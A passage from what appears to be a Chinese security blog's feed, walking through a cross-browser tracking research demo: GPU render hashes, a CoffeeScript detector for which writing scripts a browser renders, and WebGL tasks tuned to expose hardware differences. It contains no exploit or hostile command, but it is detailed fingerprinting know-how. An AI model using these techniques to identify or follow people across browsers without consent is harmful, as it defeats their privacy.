pixels.hashCode();</span><br></pre></td></tr></table></figure></p><p>比如刚才这一张图的数组计算出的hash为<br><img src="/images/2018-12-25-16-10-43.png" alt=""></p><h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p>我打开了所有的渲染任务，进行测试:<br>Chrome浏览器<br><img src="/images/2018-12-25-16-30-47.png" alt=""><br>Firefox浏览器<br><img src="/images/2018-12-25-16-31-29.png" alt=""><br>然后我打开了虚拟机，用Firefox浏览器访问<br><img src="/images/2018-12-25-16-32-07.png" alt=""><br>换了一台windows电脑，用Chrome浏览器访问<br><img src="/images/2018-12-25-16-40-05.png" alt=""><br>用Firefox浏览器访问<br><img src="/images/2018-12-25-16-40-27.png" alt=""><br>不难发现，不同设备，相同浏览器渲染任务返回的hash值出现不同，但相同设备，不同浏览器的渲染任务返回hash大部分一致。这一点也充分说明了GPU之间存在差异性，可以作为跨设备指纹特征。</p><h2 id="LanguageDetector实现"><a href="#LanguageDetector实现" class="headerlink" title="LanguageDetector实现"></a>LanguageDetector实现</h2><p>对于Writing Script的检测实现，作者使用了CoffeeScript编写，然后编译成JavaScript引入，之所以使用CoffeeScript编写再编译，因为可以减少很多代码工作量，并且语言更加简洁易懂。<br>整体代码工作量不大，进行了如下几步：<br>1.基础定义<br>2.长宽识别<br>3.长宽校验<br>4.统计结果</p><h3 id="基础定义"><a href="#基础定义" class="headerlink" title="基础定义"></a>基础定义</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">safeParseJSON = (s) -&gt;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">    <span class="built_in">JSON</span>.parse s</span><br><span class="line">  <span class="keyword">catch</span></span><br><span class="line">    <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageDetector</span></span></span><br><span class="line">  constructor: -&gt;</span><br><span class="line">    @names = safeParseJSON <span class="string">'[</span></span><br><span class="line"><span class="string">    "Latin",</span></span><br><span class="line"><span class="string">    "Chinese",</span></span><br><span class="line"><span class="string">    "Arabic",</span></span><br><span class="line"><span class="string">    "Devanagari",</span></span><br><span class="line"><span class="string">    "Cyrillic",</span></span><br><span class="line"><span class="string">    "Bengali/Assamese",</span></span><br><span class="line"><span class="string">    "Kana",</span></span><br><span class="line"><span class="string">    "Gurmukhi",</span></span><br><span class="line"><span class="string">    "Javanese",</span></span><br><span class="line"><span class="string">    "Hangul",</span></span><br><span class="line"><span class="string">    "Telugu",</span></span><br><span class="line"><span class="string">    "Tamil",</span></span><br><span class="line"><span class="string">    "Malayalam",</span></span><br><span class="line"><span class="string">    "Burmese",</span></span><br><span class="line"><span class="string">    "Thai",</span></span><br><span class="line"><span class="string">    "Sundanese",</span></span><br><span class="line"><span class="string">    "Kannada",</span></span><br><span class="line"><span class="string">    "Gujarati",</span></span><br><span class="line"><span class="string">    "Lao",</span></span><br><span class="line"><span class="string">    "Odia",</span></span><br><span class="line"><span class="string">    "Ge-ez",</span></span><br><span class="line"><span class="string">    "Sinhala",</span></span><br><span class="line"><span class="string">    "Armenian",</span></span><br><span class="line"><span class="string">    "Khmer",</span></span><br><span class="line"><span class="string">    "Greek",</span></span><br><span class="line"><span class="string">    "Lontara",</span></span><br><span class="line"><span class="string">    "Hebrew",</span></span><br><span class="line"><span class="string">    "Tibetan",</span></span><br><span class="line"><span class="string">    "Georgian",</span></span><br><span class="line"><span class="string">    "Modern Yi",</span></span><br><span class="line"><span class="string">    "Mongolian",</span></span><br><span class="line"><span class="string">    "Tifinagh",</span></span><br><span class="line"><span class="string">    "Syriac",</span></span><br><span class="line"><span class="string">    "Thaana",</span></span><br><span class="line"><span class="string">    "Inuktitut",</span></span><br><span class="line"><span class="string">    "Cherokee"</span></span><br><span class="line"><span class="string">    ]'</span></span><br><span class="line">    </span><br><span class="line">    @codes = safeParseJSON <span class="string">"[[76,97,116,105,110], </span></span><br><span class="line"><span class="string">    [27721,23383], </span></span><br><span class="line"><span class="string">    [1575,1604,1593,1585,1576,1610,1577], </span></span><br><span class="line"><span class="string">    [2342,2375,2357,2344,2366,2327,2352,2368], </span></span><br><span class="line"><span class="string">    [1050,1080,1088,1080,1083,1080,1094,1072], </span></span><br><span class="line"><span class="string">    [2476,2494,2434,2482,2494,32,47,32,2437,2488,2478,2496,2479,2492,2494], </span></span><br><span class="line"><span class="string">    [20206,21517], </span></span><br><span class="line"><span class="string">    [2583,2625,2608,2606,2625,2582,2624],</span></span><br><span class="line"><span class="string">    [43415,43438],</span></span><br><span class="line"><span class="string">    [54620,44544],</span></span><br><span class="line"><span class="string">    [3108,3142,3122,3137,3095,3137],</span></span><br><span class="line"><span class="string">    [2980,2990,3007,2996,3021], </span></span><br><span class="line"><span class="string">    [3374,3378,3375,3390,3379,3330],</span></span><br><span class="line"><span class="string">    [4121,4156,4116,4154,4121,4140],</span></span><br><span class="line"><span class="string">    [3652,3607,3618],</span></span><br><span class="line"><span class="string">    [7070,7077,7060,7082,7059],</span></span><br><span class="line"><span class="string">    [3221,3240,3277,3240,3233],</span></span><br><span class="line"><span class="string">    [2711,2753,2716,2736,2750,2724,2752],</span></span><br><span class="line"><span class="string">    [3749,3762,3751],</span></span><br><span class="line"><span class="string">    [2825,2852,2893,2837,2867],</span></span><br><span class="line"><span class="string">    [4877,4821,4829],</span></span><br><span class="line"><span class="string">    [3523,3538,3458,3524,3517],</span></span><br><span class="line"><span class="string">    [1344,1377,1397,1400,1409],</span></span><br><span class="line"><span class="string">    [6017,6098,6040,6082,6042],</span></span><br><span class="line"><span class="string">    [917,955,955,951,957,953,954,972],</span></span><br><span class="line"><span class="string">    [6674,6682,6664,6673],</span></span><br><span class="line"><span class="string">    [1488,1500,1508,1489,1497,1514],</span></span><br><span class="line"><span class="string">    [3926,3964,3921,3851],</span></span><br><span class="line"><span class="string">    [4325,4304,4320,4311,4323,4314,4312],</span></span><br><span class="line"><span class="string">    [41352,41760],</span></span><br><span class="line"><span class="string">    [6190,6179,6185,6189,6179,6191],</span></span><br><span class="line"><span class="string">    [11612,11593,11580,11593,11599,11568,11606],</span></span><br><span class="line"><span class="string">    [1808,1834,1825,1821,1808],</span></span><br><span class="line"><span class="string">    [1931,1960,1928,1964,1920,1960],</span></span><br><span class="line"><span class="string">    [5123,5316,5251,5198,5200,5222],</span></span><br><span class="line"><span class="string">    [5091,5043,5033],</span></span><br><span class="line">    [55295, 7077]]" #may need a new code for 7077</span><br><span class="line"></span><br><span class="line">    @fontSize = <span class="number">9</span></span><br><span class="line">    @fontFace = <span class="string">"Verdana"</span></span><br><span class="line">    @extraHeigth = <span class="number">15</span></span><br><span class="line">    @results = []</span><br></pre></td></tr></table></figure><p>作者选择了36种语言，然后选择了相应的语言输出相应的语言名，<br>例如:Chinese：汉字：<code>[27721,23383]</code><br><img src="/images/2018-12-21-13-35-56.png" alt=""><br>又例如:Latin：Latin：<code>[76,97,116,105,110]</code><br><img src="/images/2018-12-21-13-36-40.png" alt=""></p><h3 id="长宽识别"><a href="#长宽识别" class="headerlink" title="长宽识别"></a>长宽识别</h3><p>如何检测字体的长宽？这里作者没有直接去对字体长宽进行测量，还是选择了测量div的长宽<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@test_div = <span class="built_in">document</span>.createElement <span class="string">"div"</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild @test_div</span><br><span class="line">@test_div.id = <span class="string">"WritingTest"</span></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> @codes</span><br><span class="line">      @height = []</span><br><span class="line">      @width = []</span><br><span class="line">      #generate div</span><br><span class="line">      @div = <span class="built_in">document</span>.createElement <span class="string">"div"</span></span><br><span class="line">      @test_div.appendChild @div</span><br><span class="line">      round += <span class="number">1</span></span><br><span class="line">      @div.id = round</span><br><span class="line">      @div.style.display = <span class="string">"inline-block"</span></span><br></pre></td></tr></table></figure></p><p>这样一来对div的长宽测量就变得容易了许多<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> code</span><br><span class="line">        @div.innerHTML = <span class="string">"&lt;font face = '#&#123;@fontFace&#125;' size = "</span> + @fontSize + <span class="string">"&gt;&amp;#"</span> + c + <span class="string">"&lt;/font&gt;"</span></span><br><span class="line">        @height.push <span class="built_in">document</span>.getElementById(round).clientHeight</span><br><span class="line">        @width.push <span class="built_in">document</span>.getElementById(round).clientWidth</span><br></pre></td></tr></table></figure></p><p>然后测量每个字体div的长度和宽度，放入数组height[]和width[]，例如<br><img src="/images/2018-12-21-13-46-14.png" alt=""><br>然后对应合并<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> code</span><br><span class="line">      @div.innerHTML += <span class="string">"&lt;font face = '#&#123;@fontFace&#125;' size = "</span> + @fontSize + <span class="string">"&gt;&amp;#"</span> + c + <span class="string">"&lt;/font&gt;"</span></span><br><span class="line">@test_div.innerHTML += @height + <span class="string">";"</span> + @width + <span class="string">"&lt;br&gt;"</span></span><br><span class="line">@heights.push @height</span><br><span class="line">@widths.push @width</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-21-13-53-29.png" alt=""></p><h3 id="长宽校验"><a href="#长宽校验" class="headerlink" title="长宽校验"></a>长宽校验</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@tw = @widths.pop()</span><br><span class="line">@sw1 = @tw[<span class="number">0</span>]</span><br><span class="line">@sw2 = @tw[<span class="number">1</span>]</span><br><span class="line">@sh = @heights.pop()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> height <span class="keyword">in</span> @heights</span><br><span class="line">  @passed = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> h <span class="keyword">in</span> height</span><br><span class="line">    <span class="keyword">if</span> h != @sh</span><br><span class="line">      @support.push <span class="literal">true</span></span><br><span class="line">      @passed = <span class="number">1</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">if</span> @passed == <span class="number">0</span></span><br><span class="line">    @support.push <span class="literal">false</span> </span><br><span class="line">  </span><br><span class="line">@writing_scripts_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> width <span class="keyword">in</span> @widths</span><br><span class="line">  <span class="keyword">for</span> w <span class="keyword">in</span> width</span><br><span class="line">    <span class="keyword">if</span> @support[@writing_scripts_index] == <span class="literal">false</span></span><br><span class="line">      <span class="keyword">if</span> w != @sw1 &amp;&amp; w != @sw2</span><br><span class="line">        @support[@writing_scripts_index] = <span class="literal">true</span></span><br><span class="line">  @writing_scripts_index += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这里我们发现所有的校验都是和<code>@sh = @heights.pop()[0]</code>进行比较<br>那么我们需要知道这个数组的最后一个值是什么，我们看到最开始<code>@codes</code>的定义<br>不难发现<code>@codes</code>的数组长度是37，而<code>@names</code>的数组长度是36，这样做的原因就是作者故意在最后一组放置了无法被任何浏览器渲染的字体。这样即可让所有字体的长宽和该字体的长宽比对。<br>注：这里不直接使用方块的原因是有的浏览器可能渲染失败了未必出现方块，可能是其他形状，这样就增大了准确性和稳定性</p><h3 id="统计结果"><a href="#统计结果" class="headerlink" title="统计结果"></a>统计结果</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@res = []</span><br><span class="line">@writing_scripts_index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> @support  </span><br><span class="line">  @test_div.innerHTML += <span class="string">"#&#123;@names[@writing_scripts_index]&#125;: #&#123;s&#125; &lt;br&gt;"</span></span><br><span class="line">  <span class="keyword">if</span> s == <span class="literal">true</span></span><br><span class="line">    @res.push @names[@writing_scripts_index]</span><br><span class="line">  @writing_scripts_index += <span class="number">1</span></span><br><span class="line">@test_div.remove()</span><br></pre></td></tr></table></figure><p>最后将可渲染字符打印出来</p><h3 id="功能测试-1"><a href="#功能测试-1" class="headerlink" title="功能测试"></a>功能测试</h3><p>将代码理解完成后，自己实践了一下，不难发现不同浏览器之间的差异：<br>使用chrome浏览器，得到如下结果<br><img src="/images/2018-12-21-12-54-17.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Latin,Chinese,Arabic,Devanagari,Cyrillic,Bengali/Assamese,Kana,Gurmukhi,Hangul,Telugu,Tamil,Malayalam,Burmese,Thai,Kannada,Gujarati,Lao,Odia,Ge-ez,Sinhala,Armenian,Khmer,Greek,Hebrew,Tibetan,Georgian,Modern Yi,Mongolian,Inuktitut,Cherokee</span><br></pre></td></tr></table></figure></p><p>使用safari浏览器，得到如下结果<br><img src="/images/2018-12-21-12-54-43.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Latin,Chinese,Arabic,Devanagari,Cyrillic,Bengali/Assamese,Kana,Gurmukhi,Javanese,Hangul,Telugu,Tamil,Malayalam,Burmese,Thai,Sundanese,Kannada,Gujarati,Lao,Odia,Ge-ez,Sinhala,Armenian,Khmer,Greek,Lontara,Hebrew,Tibetan,Georgian,Modern Yi,Mongolian,Tifinagh,Syriac,Thaana,Inuktitut,Cherokee</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对作者的demo进行分析十分有趣，不仅可以学到知识，还能引发一些自己的思考~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="study" scheme="http://skysec.top/categories/study/"/>
    
    
      <category term="study" scheme="http://skysec.top/tags/study/"/>
    
  </entry>
  
  <entry>
    <title>Cross Browser Tracking Summary Part-2</title>
    <link href="http://skysec.top/2018/12/20/Cross-Browser-Tracking-Summary-Part-2/"/>
    <id>http://skysec.top/2018/12/20/Cross-Browser-Tracking-Summary-Part-2/</id>
    <published>2018-12-20T06:26:12.000Z</published>
    <updated>2019-01-27T13:45:37.129Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知 https://xz.aliyun.com/t/3722</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章主要讲解模型和参数选择部分知识，下一篇文章将讲述相关代码实现。</p><h2 id="Task-a-纹理"><a href="#Task-a-纹理" class="headerlink" title="Task(a)-纹理"></a>Task(a)-纹理</h2><p>简单来说即测试片段着色器中的常规纹理特征。<br>具体来说，即将经典的Suzanne模型在随机生成纹理的画布上呈现。纹理大小为256×256的正方形，通过随机选择每个像素的颜色来创建，即我们在一个像素的三个基色（红色，绿色和蓝色）之间产生0~255的三个随机值，将三个基色混合在一起，并将其用作像素的颜色。</p><p>之所以选择这个随机生成的纹理，是因为这个纹理比常规纹理具有更多的指纹特征。原因如下，当片段着色器将纹理映射到模型时，片段着色器需要在纹理中插入点，以便将纹理映射到模型上的每个点。插入值算法在不同的显卡中是不同的，当纹理变化很大时，差异就被放大。因此，我们需要生成在每对相邻像素之间颜色变化很大的这种纹理。<br>相关模块为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TextureTest(<span class="keyword">this</span>.susanVertices, <span class="keyword">this</span>.susanIndices, <span class="keyword">this</span>.susanTexCoords, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况<br><img src="/images/2018-12-25-13-48-49.png" alt=""><br><img src="/images/2018-12-25-13-50-20.png" alt=""><br>(后续文章将解释这个262144的数组)</p><h2 id="Task-b-渐变"><a href="#Task-b-渐变" class="headerlink" title="Task(b)-渐变"></a>Task(b)-渐变</h2><p>简单来说即测试片段着色器在画布上的渐变特征。<br>具体来说，不同的渐变颜色被画在一个正方体模型的六个面上,每个面上的4个顶点都作为颜色的出发点，例如下图<br><img src="/images/2018-12-20-15-34-30.png" alt=""><br>并且尽量选择这些渐变颜色来扩大每个面上的色彩之间的差异，例如某个面的一个顶点上蓝色比例非常大(0.9/1)，那么另一个顶点的蓝色比例就必须非常少(0.1/1)，相应的拥有更多的红色和绿色<br>相关模块为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CubeTest(<span class="string">'normal'</span>));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-49-52.png" alt=""><br><img src="/images/2018-12-25-13-50-01.png" alt=""></p><h3 id="Task-b’-抗锯齿与渐变"><a href="#Task-b’-抗锯齿与渐变" class="headerlink" title="Task(b’)-抗锯齿与渐变"></a>Task(b’)-抗锯齿与渐变</h3><p>简单来说即测试抗锯齿特征，换句话来说，即测试浏览器如何让模型边缘更加光滑<br>这里使用与Task(B)相同的方式，并且加入抗锯齿。如果进一步测试，将会发现模型的每个边缘都被柔化<br><img src="/images/2018-12-20-15-56-17.png" alt=""><br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CubeTest(<span class="string">'aa'</span>));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-50-57.png" alt=""><br><img src="/images/2018-12-25-13-51-04.png" alt=""><br>和前一张对面，边缘的确有显著的柔化</p><h2 id="Task-c-camera"><a href="#Task-c-camera" class="headerlink" title="Task(c)-camera"></a>Task(c)-camera</h2><p>简单来说即测试投影特性，换句话说，即一个输入片段着色器的投影矩阵<br>所有的配置信息都与任务一致，除了camera的被移动到了新的位置<code>[-1,-4,-10]</code>，得到的立方体比Task(b)更小，因为camera被移动的离立方体更远<br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> CameraTest());</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-51-54.png" alt=""><br><img src="/images/2018-12-25-13-52-00.png" alt=""></p><h2 id="Task-d-直线与曲线"><a href="#Task-d-直线与曲线" class="headerlink" title="Task(d)-直线与曲线"></a>Task(d)-直线与曲线</h2><p>简单来说即测试直线和曲线。 在画布上绘制一条曲线和三条不同角度的直线。<br>具体来说，曲线遵循以下公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = 256-100cos(2.0πx/ 100.0)+ 30cos(4.0πx/ 100.0)+ 6cos(6.0πx/ 100.0)</span><br></pre></td></tr></table></figure></p><p>其中[0,0]为画布的左上角，x轴向右增加，y轴增加到底部。<br>三条直线的起点和终点是<br><code>{[38.4,115.2]，[89.6,204.8]}</code>，<code>{[89.6,89.6]，[153.6,204.8]}</code>和<code>{[166.4,89.6]，[217.6,204.8]}</code>。<br>选择这些特定的线条和曲线，以便测试不同的渐变和形状。<br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LineTest(<span class="string">'normal'</span>));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-53-02.png" alt=""><br><img src="/images/2018-12-25-13-53-09.png" alt=""></p><h3 id="Task-d’-抗锯齿与直线与曲线"><a href="#Task-d’-抗锯齿与直线与曲线" class="headerlink" title="Task(d’)-抗锯齿与直线与曲线"></a>Task(d’)-抗锯齿与直线与曲线</h3><p>即在Task(d)中加入了抗锯齿<br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> LineTest(<span class="string">'aa'</span>));</span><br></pre></td></tr></table></figure></p><p>不难发现边缘显著得到柔化<br><img src="/images/2018-12-25-13-54-02.png" alt=""><br><img src="/images/2018-12-25-13-53-55.png" alt=""></p><h2 id="Task-e-多重模型"><a href="#Task-e-多重模型" class="headerlink" title="Task(e)-多重模型"></a>Task(e)-多重模型</h2><p>简单来说即测试多个不同的模型在同一个画布上如何相互影响<br>除了Suzanne模型，这里引入了另一种模型：看起来像一个人倚靠在沙发上，称之为sofa模型，我们将两个模型平行放置，并同样对sofa模型用Task(a)中的随机生成的纹理进行着色<br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TextureTest(<span class="keyword">this</span>.combinedVertices, <span class="keyword">this</span>.combinedIndices, <span class="keyword">this</span>.combinedTexCoords, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-54-53.png" alt=""><br><img src="/images/2018-12-25-13-54-47.png" alt=""></p><h2 id="Task-f-光线"><a href="#Task-f-光线" class="headerlink" title="Task(f)-光线"></a>Task(f)-光线</h2><p>简单来说即测试漫射点光和Suzanne模型的相互作用。 漫射点光在照亮物体时会引起漫反射。 具体地说，该光是在RGB上具有相同值的白色，对于每种原色，光的功率为2，光源位于<code>[3.0,-4.0,-2.0]</code>。</p><p>在这个任务中选择一个白光源，因为纹理是各种颜色的，单色光可能会减少纹理上的一些微妙差异。 光线的强度需要精心设计。非常弱的光线不会照亮Suzanne模型，模型就会不可见；非常强的光会使一切变白，减少指纹特征。 在6台机器的小规模实验中，功率从0增加到255，我们发现当光功率为2时，这些机器之间的像素差异最大。并且光照位置可随机选择，不会影响特征指纹识别结果。<br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> SimpleLightTest(<span class="keyword">this</span>.susanVertices, <span class="keyword">this</span>.susanIndices, <span class="keyword">this</span>.susanTexCoords, <span class="keyword">this</span>.susanNormals, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-55-50.png" alt=""><br><img src="/images/2018-12-25-13-56-04.png" alt=""></p><h2 id="Task-g-光线与模型"><a href="#Task-g-光线与模型" class="headerlink" title="Task(g)-光线与模型"></a>Task(g)-光线与模型</h2><p>简单来说即测试漫射点光和Suzanne模型与sofa模型的相互作用<br>因为当某个点的被光照时，一个模型可能会在另一个模型上产生阴影<br>这个任务中所有的光线配置与Task(f)一致，并且模型与Task(e)一致<br><img src="/images/2018-12-20-16-09-17.png" alt=""><br>相关模块如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> SimpleLightTest(<span class="keyword">this</span>.combinedVertices, <span class="keyword">this</span>.combinedIndices, <span class="keyword">this</span>.combinedTexCoords, <span class="keyword">this</span>.combinedNormals, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-13-57-30.png" alt=""><br><img src="/images/2018-12-25-13-57-39.png" alt=""></p><h2 id="Task-h-镜面光"><a href="#Task-h-镜面光" class="headerlink" title="Task(h)-镜面光"></a>Task(h)-镜面光</h2><p>简单来说即测试另一种色彩的漫射点光与镜面点光对2个模型的作用<br>与漫射点光相似，镜面点光将会导致照射对象的镜面反射，两束光源都位于<code>[0.8,-0.8,-0.8]</code><br>漫射点光的RGB为<code>[0.75,0.75,1.0]</code>，镜面点光的RGB为<code>[0.8,0.8,0.8]</code></p><p>这里有两件事值得注意。其一，我们选择了一个特殊的camera位置，其距离模型很近，并且有更大的影响，尤其是当sofa模型后部被镜面点光照射时。其二，虽然漫射点光是偏蓝色的，但是它依旧含有不少红色与绿色，我们想要测试其他颜色的光线，但是最后发现，在纹理是彩色的时候，白光依旧是最好的，它能获取到最多的指纹特征<br><img src="/images/2018-12-20-17-16-48.png" alt=""><br>相关代码如下，这里进行了多重测试，例如加入抗锯齿，再加入90度旋转，所以得到3组数据<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> MoreLightTest(<span class="keyword">this</span>.combinedVertices, <span class="keyword">this</span>.combinedIndices, <span class="keyword">this</span>.combinedTexCoords, <span class="keyword">this</span>.combinedNormals, <span class="keyword">this</span>.texture));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-25-14-22-31.png" alt=""><br><img src="/images/2018-12-25-14-22-39.png" alt=""></p><h2 id="Task-i-双纹理"><a href="#Task-i-双纹理" class="headerlink" title="Task(i)-双纹理"></a>Task(i)-双纹理</h2><p>简单来说即测试对同一对象进行不同的纹理覆盖会有什么影响<br>我们生成另一种随机的纹理对Suzanne和sofa模型进行覆盖<br><img src="/images/2018-12-21-09-08-19.png" alt=""><br>相关代码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.testList.push(<span class="keyword">new</span> TwoTexturesMoreLightTest(<span class="keyword">this</span>.combinedVertices, <span class="keyword">this</span>.combinedIndices, <span class="keyword">this</span>.combinedTexCoords, <span class="keyword">this</span>.combinedNormals, <span class="keyword">this</span>.texture, <span class="keyword">this</span>.texture1));</span><br></pre></td></tr></table></figure></p><p>运行情况如下<br><img src="/images/2018-12-26-09-58-04.png" alt=""></p><h2 id="Task-j-Alpha"><a href="#Task-j-Alpha" class="headerlink" 